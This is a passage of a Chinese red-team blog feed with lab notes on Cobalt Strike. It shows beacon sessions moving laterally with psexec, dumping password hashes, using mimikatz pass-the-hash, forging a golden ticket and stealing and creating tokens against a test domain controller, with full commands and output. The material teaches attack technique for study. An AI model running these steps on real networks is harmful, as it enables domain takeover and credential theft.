也可以通过图形化的方式进行上述操作，这样也使得横向移动更加的简单。</p><p>接下来进行一下演示，目前手中有一个普通机器的管理员会话，我们先在这台机器上运行 <code>net view</code> 查看一下当前域环境中的主机信息。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> net view<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run net view<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 104504 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:List of hosts:<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output: Server Name             IP Address                       Platform  Version  <span class="token function">Type</span>   Comment <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>             <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>                       <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>  <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>  <span class="token operator">--</span>-<span class="token operator">-</span>   <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>             WINDC                   192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>144                  500       6<span class="token punctuation">.</span>1      PDC     WINTEST                 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>130                  500       6<span class="token punctuation">.</span>1         <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为是自己本地搭建的测试环境，所以主机很少，可以看到当前域中有两台机器，再利用 PowerView 查找一下具有本地管理员访问权限的用户</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> powershell<span class="token operator">-</span>import PowerView<span class="token punctuation">.</span>ps1<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to import: PowerView<span class="token punctuation">.</span>ps1<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 101224 bytesbeacon> powershell <span class="token function">Find-LocalAdminAccess</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">Find-LocalAdminAccess</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 329 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:WinDC<span class="token punctuation">.</span>teamssix<span class="token punctuation">.</span>com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来在 WinDC 上运行 psexec，因为这里是 64 位的，所以选择 psexec64，之后监听选择一个 smb beacon，会话就选择已经上线的 wintest 主机的会话，并勾选使用当前会话的访问令牌。</p><p>这里笔者认为应该是因为当前在 wintest 主机上有 windc 的管理员账户登录着，所以使用 wintest 的访问令牌是可以获取 windc 的信任的，类似于 <a href="https://teamssix.com/year/200419-150622.html">CS 学习笔记 17 节</a>里的描述方法，如有不正确之处，还请多多指教。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs19-2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>之后，windc 主机就上线了，域中如果还有其他主机，也可以使用这种方法去横向移动。</p><blockquote><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></p><p><a href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf">https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CS 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CS学习笔记】18、密码哈希散列设置信任</title>
      <link href="//200419-150630.html"/>
      <url>//200419-150630.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>继续上一节密码哈希的部分，在上一节中讲到了使用密码生成用户的令牌，从而取得系统的信任，这一节将介绍使用密码的哈希值来取得系统的信任。</p><h1 id="0x01-密码哈希"><a href="#0x01-密码哈希" class="headerlink" title="0x01 密码哈希"></a>0x01 密码哈希</h1><p>首先使用 <code>hashdump</code> 获取用户的密码哈希值，这里的 beacon 会话为 SYSTEM 权限。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> hashdump<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to dump hashes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 82501 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received password hashes:Administrator:500:aca3b435b5z404eeaad3f435b51404he:12cb161bvca930994x00cbc0aczf06d1:::Daniel:1000:aca3b435b5z404eeaad3f435b51404he:12cb161bvca930994x00cbc0aczf06d1:::Guest:501:aca3b435b5z404eeaad3f435b51404he:31d6cfe0d16ae931b73c59d7e0c089c0:::TeamsSix:1002:aca3b435b5z404eeaad3f435b51404he:12cb161bvca930994x00cbc0aczf06d1:::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用 <code>pth</code> 获取信任</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> pth TEAMSSIX\Administrator 12cb161bvca930994x00cbc0aczf06d1<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 23 bytes<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run mimikatz's sekurlsa::pth <span class="token operator">/</span>user:Administrator <span class="token operator">/</span>domain:TEAMSSIX <span class="token operator">/</span>ntlm:12cb161bvca930994x00cbc0aczf06d1 <span class="token operator">/</span>run:<span class="token string">"%COMSPEC% /c echo ade660d8dce > \\.\pipe\8d3e4c"</span> command<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 750600 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 71 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Impersonated NT AUTHORITY\SYSTEM<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:user: Administratordomain: TEAMSSIXprogram: C:\Windows\system32\cmd<span class="token punctuation">.</span>exe <span class="token operator">/</span>c <span class="token function">echo</span> ade660d8dce > \\<span class="token punctuation">.</span>\pipe\8d3e4cimpers<span class="token punctuation">.</span>: noNTLM: 12cb161bvca930994x00cbc0aczf06d1  <span class="token punctuation">|</span>  PID  2992  <span class="token punctuation">|</span>  TID  5028  <span class="token punctuation">|</span>  LSA <span class="token keyword">Process</span> is now R<span class="token operator">/</span>W  <span class="token punctuation">|</span>  LUID 0 <span class="token punctuation">;</span> 14812112 <span class="token punctuation">(</span>00000000:00e203d0<span class="token punctuation">)</span>  \_ msv1_0   <span class="token operator">-</span> <span class="token keyword">data</span> <span class="token function">copy</span> @ 0000000001794E80 : OK <span class="token operator">!</span>  \_ kerberos <span class="token operator">-</span> <span class="token keyword">data</span> <span class="token function">copy</span> @ 000000000044A188   \_ aes256_hmac       <span class="token operator">-</span>> null                \_ aes128_hmac       <span class="token operator">-</span>> null                \_ rc4_hmac_nt       OK   \_ rc4_hmac_old      OK   \_ rc4_md4           OK   \_ rc4_hmac_nt_exp   OK   \_ rc4_hmac_old_exp  OK   \_ <span class="token operator">*</span>Password replace @ 00000000017DA1E8 <span class="token punctuation">(</span>16<span class="token punctuation">)</span> <span class="token operator">-</span>> nullbeacon> powershell <span class="token function">Invoke-Command</span> <span class="token operator">-</span>computer WinDC <span class="token operator">-</span>ScriptBlock <span class="token punctuation">&#123;</span>whoami<span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">Invoke-Command</span> <span class="token operator">-</span>computer WinDC <span class="token operator">-</span>ScriptBlock <span class="token punctuation">&#123;</span>whoami<span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 231 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:teamssix\administrator<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x02-Kerberos-票据"><a href="#0x02-Kerberos-票据" class="headerlink" title="0x02 Kerberos 票据"></a>0x02 Kerberos 票据</h1><p>关于 Kerberos 的介绍可以查看知乎上的一篇文章，比较形象生动，文章地址： <a href="https://www.zhihu.com/question/22177404">https://www.zhihu.com/question/22177404</a></p><p>查看有哪些 Kerberos 票据</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">shell klist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>除去 kerberos 票据</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">kerberos_ticket_purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>加载 kerberos 票据</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">kerberos_ticket_use <span class="token punctuation">[</span><span class="token operator">/</span>path<span class="token operator">/</span>to<span class="token operator">/</span>file<span class="token punctuation">.</span>ticket<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="0x03-黄金票据"><a href="#0x03-黄金票据" class="headerlink" title="0x03 黄金票据"></a>0x03 黄金票据</h1><p>黄金票据 <code>Golden Ticket</code> 是 KRBTGT 帐户的 Kerberos 身份验证令牌，KRBTGT 帐户是一个特殊的隐藏帐户，用于加密 DC 的所有身份验证令牌。然后黄金票据可以使用哈希传递技术登录到任何帐户，从而使攻击者可以在网络内部不受注意地移动。</p><p><strong>使用 mimikatz 伪造黄金票据需要：</strong></p><p><strong>1、目标的用户名及域名</strong></p><p><strong>2、域的 SID 值</strong></p><p>域的 SID 值即安全标识符 <code>Security Identifiers</code>，使用 <code>whoami /user</code> 命令可查看，注意不需要 SID 最后的一组数字。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell whoami <span class="token operator">/</span>user<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: whoami <span class="token operator">/</span>user<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 43 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:用户信息<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>用户名        SID                                         ============= ============================================teamssix\daniel S<span class="token operator">-</span>1<span class="token operator">-</span>5<span class="token operator">-</span>21<span class="token operator">-</span>5311978431<span class="token operator">-</span>183514165<span class="token operator">-</span>284342044<span class="token operator">-</span>1000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为不需要 SID 最后一组数字，所以这里要使用的 SID 也就是 <code>S-1-5-21-5311978431-183514165-284342044</code></p><p><strong>3、DC 中  KRBTGT  用户的 NTLM 哈希</strong></p><p>DC 中  KRBTGT  用户的 NTLM 哈希可以通过 dcsync 或 hashdump 获得，下面的 hashdump 命令在域控制器的 SYSTEM 权限会话下运行。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> hashdump<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to dump hashes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 82501 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received password hashes:Administrator:500:aca3b435b5z404eeaad3f435b51404he:12cb161bvca930994x00cbc0aczf06d1:::Guest:501:aca3b435b5z404eeaad3f435b51404he:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aca3b435b5z404eeaad3f435b51404he:z1f8417a00az34scwb0dc15x66z43bg1:::daniel:1108:aca3b435b5z404eeaad3f435b51404he:12cb161bvca930994x00cbc0aczf06d1:::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Cobalt Strike 在 <code>Access -&gt; Golden Ticket</code> 中可以打开生成黄金票据的界面。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs18-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>信息填完之后，选择 Build，需要注意 Domain 需要填写成 FQDN 格式，即完全合格域名 <code>Fully Qualified Domain Name</code> ，也就是类似于 <code>teamssix.com</code> 的格式。</p><p>此时可以通过 <code>shell dir \\host\C$</code> 检查自己是否有权限，也可以使用 PowerShell 运行 whoami 查看自己是谁。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> powershell <span class="token function">Invoke-Command</span> <span class="token operator">-</span>computer WinDC <span class="token operator">-</span>ScriptBlock <span class="token punctuation">&#123;</span>whoami<span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">Invoke-Command</span> <span class="token operator">-</span>computer WinDC <span class="token operator">-</span>ScriptBlock <span class="token punctuation">&#123;</span>whoami<span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 203 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:teamssix\administrator<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></p><p><a href="https://www.varonis.com/blog/kerberos-how-to-stop-golden-tickets/">https://www.varonis.com/blog/kerberos-how-to-stop-golden-tickets/</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CS 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CS学习笔记】17、登陆验证的难点</title>
      <link href="//200419-150622.html"/>
      <url>//200419-150622.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>如果当前账号权限被系统认为是本地管理员权限，那么就可以执行很多管理员才能做的事，接下来就来看一下这样的一个过程是如何工作的，其中会涉及到以下要点：</p><p>1、<code>Access Token</code> 登录令牌</p><p>2、<code>Credentials</code> 凭证</p><p> 3、<code>Password Hashes</code> 密码哈希</p><p>4、<code>Kerberos Tickets</code> 登录凭据</p><h1 id="0x01-登录令牌"><a href="#0x01-登录令牌" class="headerlink" title="0x01 登录令牌"></a>0x01 登录令牌</h1><ul><li>登录令牌在登录之后被创建</li><li>与每个进程和线程相关联</li><li>包括：<ul><li>用户和用户组的信息</li><li>本地计算机上的特权列表</li><li>限制（删除用户和用户组的权限）</li><li>参考凭证（支持单点登录）</li></ul></li><li>一直保存在内存中，直到系统重启</li></ul><p><strong>以下是令牌窃取的过程：</strong></p><ul><li>使用 <code>ps</code> 列出进程</li><li>使用 <code>steal_token [pid]</code> 窃取令牌</li><li>使用 <code>getuid</code> 找到你是谁</li><li>使用 <code>rev2self</code> 移除令牌</li></ul><p>接下来将对这些命令进行演示，目前有一个 SYSTEM 权限的会话，该会话在 WIN-72A8ERDSF2P 主机下，此时想查看 WIN-P2AASSD1AF1 主机下的文件（WIN-P2AASSD1AF1 主机是 TEAMSSIX 域的域控制器），那么直接运行 dir 会提示拒绝访问。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell <span class="token function">dir</span> \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">dir</span> \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 55 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:拒绝访问。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时，先用 <code>ps</code> 查看一下当前系统进程信息。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> <span class="token function">ps</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to list processes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 12 bytes<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token keyword">Process</span> List PID   PPID  Name                         Arch  Session     User <span class="token operator">--</span><span class="token operator">-</span>   <span class="token operator">--</span>-<span class="token operator">-</span>  <span class="token operator">--</span>-<span class="token operator">-</span>                         <span class="token operator">--</span>-<span class="token operator">-</span>  <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>     <span class="token operator">--</span>-<span class="token operator">--</span> 0     0     <span class="token namespace">[System Process]</span>                                4     0     System                       x64   0           NT AUTHORITY\SYSTEM……内容太多，此处省略…… 3720  524   taskhost<span class="token punctuation">.</span>exe                 x64   2           WIN<span class="token operator">-</span>75F8PRJM4TP\Administrator 4092  236   dwm<span class="token punctuation">.</span>exe                      x64   3           TEAMSSIX\Administrator<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过进程信息可以发现 TEAMSSIX 域下的管理员账户此时在当前 SYSTEM 会话的主机上是登录着的，使用 <code>steal_token [pid]</code> 命令窃取 TEAMSSIX\Administrator 账户的令牌</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> steal_token 4092<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to steal token <span class="token keyword">from</span> PID 4092<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 12 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Impersonated TEAMSSIX\administrator<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>查看一下当前会话 uid</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> getuid<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to get userid<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 8 bytes<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> You are TEAMSSIX\administrator <span class="token punctuation">(</span>admin<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>再次尝试获取域控制器主机下的文件</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell <span class="token function">dir</span> \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">dir</span> \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 55 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output: 驱动器 \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$ 中的卷没有标签。 卷的序列号是 F269<span class="token operator">-</span>89A7 \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$ 的目录2020<span class="token operator">/</span>07<span class="token operator">/</span>16  21:24    &lt;<span class="token function">DIR</span>>          Program Files2020<span class="token operator">/</span>07<span class="token operator">/</span>16  21:52    &lt;<span class="token function">DIR</span>>          Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>2020<span class="token operator">/</span>07<span class="token operator">/</span>17  23:00    &lt;<span class="token function">DIR</span>>          Users2020<span class="token operator">/</span>07<span class="token operator">/</span>26  00:55    &lt;<span class="token function">DIR</span>>          Windows               0 个文件      0 字节               4 个目录 28<span class="token punctuation">,</span>493<span class="token punctuation">,</span>299<span class="token punctuation">,</span>712 可用字节<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs17-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>发现可以成功访问了，使用  <code>rev2self</code> 可移除当前窃取的令牌</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> rev2self<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to revert token<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 8 bytes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>再次查看 uid 发现变成了原来的 SYSTEM 权限，此时 WIN-P2AASSD1AF1 主机上的文件也拒绝访问了。</p> <pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> getuid<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to get userid<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 8 bytes<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> You are NT AUTHORITY\SYSTEM <span class="token punctuation">(</span>admin<span class="token punctuation">)</span>beacon> shell <span class="token function">dir</span> \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">dir</span> \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 55 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:拒绝访问。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x02-凭证"><a href="#0x02-凭证" class="headerlink" title="0x02 凭证"></a>0x02 凭证</h1><p>1、使用 make_token 创建一个令牌</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">make_token DOMAIN\user password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在运行命令之前，需要知道要获取令牌用户的密码，这里可以使用 mimikatz 进行获取，具体的方法可参考<a href="https://teamssix.com/year/200419-150600.html">《CS学习笔记 | 14、powerup提权的方法》</a>这一节中的介绍。</p><p>这里还是和上文一样的环境，在一个 SYSTEM 会话下，获取 TEAMSSIX\administrator 账号令牌，使用 mimikatz 可以得知 TEAMSSIX\administrator 账号密码为 Test111!，接下来使用 <code>make_token</code> 命令。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> make_token TEAMSSIX\administrator Test111<span class="token operator">!</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to create a token <span class="token keyword">for</span> TEAMSSIX\administrator<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 53 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Impersonated NT AUTHORITY\SYSTEMbeacon> shell <span class="token function">dir</span> \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">dir</span> \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 55 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output: 驱动器 \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$ 中的卷没有标签。 卷的序列号是 F269<span class="token operator">-</span>89A7 \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$ 的目录2020<span class="token operator">/</span>07<span class="token operator">/</span>16  21:24    &lt;<span class="token function">DIR</span>>          Program Files2020<span class="token operator">/</span>07<span class="token operator">/</span>16  21:52    &lt;<span class="token function">DIR</span>>          Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>2020<span class="token operator">/</span>07<span class="token operator">/</span>17  23:00    &lt;<span class="token function">DIR</span>>          Users2020<span class="token operator">/</span>07<span class="token operator">/</span>26  00:55    &lt;<span class="token function">DIR</span>>          Windows               0 个文件      0 字节               4 个目录 28<span class="token punctuation">,</span>493<span class="token punctuation">,</span>299<span class="token punctuation">,</span>712 可用字节               beacon> powershell <span class="token function">Invoke-Command</span> <span class="token operator">-</span>computer WIN<span class="token operator">-</span>P2AASSD1AF1 <span class="token operator">-</span>ScriptBlock <span class="token punctuation">&#123;</span>whoami<span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">Invoke-Command</span> <span class="token operator">-</span>computer WIN<span class="token operator">-</span>P2AASSD1AF1 <span class="token operator">-</span>ScriptBlock <span class="token punctuation">&#123;</span>whoami<span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 231 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:teamssix\administrator<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当密码输入错误时，执行上面的两个命令就会提示 <code>登录失败: 未知的用户名或错误密码。</code> 同样的使用 <code>rev2self</code> 可除去当前令牌，恢复原来的 SYSTEM 权限。</p><p>2、使用 spawn beacon 替代凭证</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">spawnas DOMAIN\user password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3、在目标上建立账户</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">net use \\host\C$<span class="token operator">/</span>USER:DOMAIN\user password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这两种方法，在之前的笔记中都或多或少的提及过，这里不再过多赘述。</p><h1 id="0x03-密码哈希"><a href="#0x03-密码哈希" class="headerlink" title="0x03 密码哈希"></a>0x03 密码哈希</h1><p>使用 mimikatz 获取密码哈希</p><pre class="line-numbers language-none"><code class="language-none">pth DOMAIN\user ntlmhash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如何工作的？</p><p>1、mimikatz 使用登录令牌开启了一个进程，在单点登录信息那里填入我们提供的用户名称、域、密码哈希值</p><p>2、cobalt strike 自动的从那个进程中窃取令牌并关闭</p><blockquote><p>参考链接：<a 